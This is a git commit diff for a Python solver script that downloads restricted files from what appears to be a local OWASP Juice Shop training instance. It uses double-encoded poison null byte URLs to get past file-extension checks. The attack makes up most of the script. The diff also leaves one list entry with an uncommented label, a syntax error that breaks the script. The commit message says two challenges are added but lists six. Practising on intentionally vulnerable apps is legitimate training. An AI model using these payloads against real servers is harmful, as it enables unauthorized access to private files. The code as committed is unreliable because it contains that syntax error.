0d445c455b8fd64b0763ad33cfa797465b831070
mdytman <48649783+mdytman@users.noreply.github.com>
2023-06-05 18:35:21 +0200

    Add two 4-stars file download challenges to solver
    4 stars challenges that will be solved with the script file_download.py:
    - Forgotten Developer Backup 
    - Poison Null Byte
    - Forgotten Sales Backup
    - Misplaced Signature File
    - Easter Egg
    - Nested Easter Egg

--- file_download.py
+++ file_download.py
@@ -1,6 +1,8 @@
 import requests
 import sys
 
+
+# sending requests with proper headers
 def send_get_request(url, cookie_value):
     headers = {
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
@@ -22,16 +24,19 @@ def send_get_request(url, cookie_value):
     print('')
 
 if __name__ == '__main__':
-    base_url = 'http://localhost:3000'
+    base_url = 'http://localhost:3000' # defining base URL (URL of application)
 
-    cookie_value = sys.argv[1]  # Pobranie wartości Cookie z argumentu wywołania skryptu
+    cookie_value = sys.argv[1]  # retrieving the value of the cookie from the script execution argument
 
     urls = [
-        '/ftp/suspicious_errors.yml%25%30%30.md',
-        '/ftp/package.json.bak%25%30%30.md',
-        '/ftp/coupons_2013.md.bak%25%30%30.md'
+        '/ftp/coupons_2013.md.bak%25%30%30.md', # Forgotten Sales Backup
+        '/ftp/suspicious_errors.yml%25%30%30.md', # Misplaced Signature File
+        '/ftp/package.json.bak%25%30%30.md', Forgotten Developer Backup & Poison Null Byte
+        '/ftp/eastere.gg%25%30%30.md', # Easter Egg
+        '/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg' # Nested Easter Egg
     ]
 
+# loop sending requests with full URL and current cookie value
     for url in urls:
         full_url = base_url + url
         send_get_request(full_url, cookie_value)
